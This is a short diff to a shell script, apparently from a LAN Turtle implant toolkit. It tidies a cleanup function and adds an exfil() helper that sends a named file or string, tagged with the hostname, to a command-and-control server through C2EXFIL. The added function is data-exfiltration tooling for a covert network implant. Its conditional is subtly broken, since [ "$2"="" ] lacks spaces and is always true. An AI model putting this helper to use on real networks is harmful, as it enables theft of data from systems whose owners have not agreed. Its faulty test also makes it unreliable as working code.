@@ -15,7 +15,7 @@ pulldeploy() {
 
 deploycleanup() {
   cd
-  
+
   if [ -f /root/main.zip ]
   then
     rm /root/main.zip
@@ -24,5 +24,19 @@ deploycleanup() {
   if [ -d /root/lanturtle-scripts-main ]
   then
     rm -rfv /root/lanturtle-scripts-main
+  fi
+}
+
+exfil() {
+  if [ "$2"="" ]
+  then
+    source="manual-exfil"
+  else
+    source=$2
+  fi
+
+  if ! C2EXFIL STRING $1 ${HOSTNAME}-$source
+  then
+    echo "error exfiltrating $1"
   fi
 }
